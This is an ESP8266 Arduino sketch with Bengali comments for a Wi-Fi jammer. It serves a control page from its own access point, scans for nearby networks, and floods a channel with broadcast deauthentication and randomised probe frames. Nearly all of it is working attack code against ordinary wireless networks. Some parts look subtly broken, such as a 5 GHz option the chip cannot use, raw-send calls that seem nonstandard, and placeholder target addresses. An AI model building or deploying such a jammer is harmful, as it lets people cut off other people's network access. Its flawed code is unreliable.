#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <WiFiClient.h>

// --- সেটিংস ---
const char* ssid = "FreeNet";
const char* password = "freenet8266";
ESP8266WebServer server(80);

// ভেরিয়েবল
bool isAttacking = false;
int attackType = 0;
int targetChannel = 6;

// Deauth Frame
uint8_t deauthFrame[26] = {
  0xc0, 0x00, 
  0x00, 0x00, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 
  0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 
  0x00, 0x00, 
  0x07, 0x00  
};

// ddosFrame (fixed)
uint8_t ddosFrame[30] = {
  0x40, 0x00, 
  0x00, 0x00, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 
  0x00, 0x00, 
  0x00,       
  0x00        
};

// HTML + JS
String htmlPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ESP8266 Jammer</title>
<style>
body { font-family: Arial; background:#1a1a1a; color:white; text-align:center; }
.container { max-width:400px; margin:auto; background:#2d2d2d; padding:20px; border-radius:10px; }
.btn { width:100%; padding:12px; margin:10px 0; border:none; border-radius:5px; }
.btn-scan { background:#2196F3; color:white; }
.btn-start { background:#4CAF50; color:white; }
.btn-stop { background:#f44336; color:white; }
select { width:100%; padding:10px; margin:8px 0; }
</style>
</head>

<body>
<h2>ESP8266 Control</h2>

<div class="container">

<button class="btn btn-scan" onclick="scanNetworks()">Scan</button>

<select id="targetRouter"></select>

<select id="attackMode">
<option value="0">Deauth</option>
<option value="1">DDOS</option>
<option value="2">Both</option>
</select>

<select id="bandSelect">
<option value="2.4">2.4 GHz</option>
<option value="5">5 GHz</option>
</select>

<button class="btn btn-start" onclick="startAttack()">Start</button>
<button class="btn btn-stop" onclick="stopAttack()">Stop</button>

<p id="statusText">Idle</p>

</div>

<script>
function scanNetworks() {
    document.getElementById('statusText').innerText = "Scanning...";
    fetch('/scan')
    .then(res => res.json())
    .then(data => {
        let select = document.getElementById('targetRouter');
        select.innerHTML = "";

        data.forEach(router => {
            let option = document.createElement('option');
            option.value = router.channel;
            option.text = router.name + " (" + router.rssi + " dBm)";
            select.appendChild(option);
        });

        document.getElementById('statusText').innerText = "Done";
    });
}

function startAttack() {
    let mode = document.getElementById('attackMode').value;
    let band = document.getElementById('bandSelect').value;
    fetch(`/start?mode=${mode}&band=${band}`);
    document.getElementById('statusText').innerText = "Attacking...";
}

function stopAttack() {
    fetch('/stop');
    document.getElementById('statusText').innerText = "Stopped";
}
</script>

</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);

  WiFi.softAP(ssid, password);

  server.on("/", [](){
    server.send(200, "text/html", htmlPage);
  });

  server.on("/scan", HTTP_GET, [](){
    int n = WiFi.scanNetworks();

    String json = "[";

    if (n > 0) {
      for (int i = 0; i < n; i++) {
        if (i > 0) json += ",";
        json += "{\"name\":\"" + WiFi.SSID(i) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + ",\"channel\":" + String(WiFi.channel(i)) + "}";
      }
      WiFi.scanDelete();
    } else {
      json += "{\"name\":\"No Network\",\"rssi\":-100,\"channel\":6}";
    }

    json += "]";
    server.send(200, "application/json", json);
  });

  server.on("/start", HTTP_GET, [](){
    attackType = server.arg("mode").toInt();
    String band = server.arg("band");

    targetChannel = (band == "5") ? 36 : 6;
    isAttacking = true;

    server.send(200, "text/plain", "Started");
  });

  server.on("/stop", HTTP_GET, [](){
    isAttacking = false;
    server.send(200, "text/plain", "Stopped");
  });

  server.begin();
}

void loop() {
  server.handleClient();

  if (isAttacking) {
    performAttack();
  }
}

void performAttack() {
  WiFi.setChannel(targetChannel);

  for(int i=0;i<3;i++){
    WiFi.sendRawPacket(deauthFrame, sizeof(deauthFrame), targetChannel);
  }

  if (attackType == 1 || attackType == 2) {
    for(int i=10;i<16;i++){
      ddosFrame[i] = random(256);
    }
    WiFi.sendRawPacket(ddosFrame, sizeof(ddosFrame), targetChannel);
  }
}
